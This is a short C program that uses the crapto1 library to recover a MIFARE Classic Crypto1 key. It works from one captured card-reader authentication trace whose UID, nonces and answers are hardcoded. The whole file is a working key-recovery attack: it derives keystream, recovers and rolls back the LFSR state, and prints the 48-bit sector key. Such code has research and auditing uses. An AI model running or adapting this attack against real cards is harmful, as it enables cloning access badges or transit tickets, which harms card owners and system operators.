#include "crapto1.h"
#include <stdio.h>

int main (int argc, char* argv[]) {
struct Crypto1State *revstate;
uint64_t lfsr;
unsigned char* plfsr = (unsigned char*)&lfsr;

uint32_t uid = 0x9c599b32;
uint32_t nt = 0x82a4166c; /* Nonce Tag */
uint32_t nr = 0xa1e458ce; /* Nonce Reader */
uint32_t at = 0x5cadf439; /* Answer Tag */
uint32_t ar = 0x6eea41e0; /* Answer Reader */
uint32_t ks2 = ar ^ prng_successor(nt, 64);
uint32_t ks3 = at ^ prng_successor(nt, 96);
printf("nt’: %08x\n", prng_successor(nt, 64));
printf("nt’’: %08x\n", prng_successor(nt, 96));
printf("ks2: %08x\n",ks2);
printf("ks3: %08x\n",ks3);

revstate = lfsr_recovery64(ks2, ks3);
lfsr_rollback_word(revstate, 0, 0);
lfsr_rollback_word(revstate, 0, 0);
lfsr_rollback_word(revstate, nr, 1);
lfsr_rollback_word(revstate, uid ^ nt, 0);
crypto1_get_lfsr(revstate, &lfsr);
printf("Found Key: [%02x %02x %02x %02x %02x %02x]\n\n",
plfsr[0], plfsr[1], plfsr[2], plfsr[3], plfsr[4], plfsr[5]);
return 0;
}
